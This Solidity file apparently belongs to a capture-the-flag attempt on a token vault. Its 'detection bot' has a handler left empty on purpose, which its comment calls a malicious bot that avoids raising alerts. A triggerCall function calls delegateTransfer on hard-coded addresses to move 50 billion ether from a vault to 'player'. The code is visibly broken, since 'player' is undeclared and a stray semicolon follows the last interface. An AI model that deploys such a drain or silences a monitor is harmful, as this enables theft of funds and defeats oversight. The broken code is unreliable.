pragma solidity ^0.8.0;

interface IDetectionBot {
    function handleTransaction(address, bytes calldata) external;
}


contract DetectionBotMock is IDetectionBot {
    function handleTransaction(address, bytes calldata) external override {
        // Malicious bot that does nothing to avoid raising alerts
    }

    function triggerCall() external {
        address detContract = 0x10C6E9530F1C1AF873a391030a1D9E8ed0630D26;
        address vault = address(0xeEBe00Ac0756308ac4AaBfD76c05c4F3088B8883);
        IDoubleEntryPoint(detContract).delegateTransfer(player, 50_000_000_000 ether, vault);
    }
}


interface IDoubleEntryPoint {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
};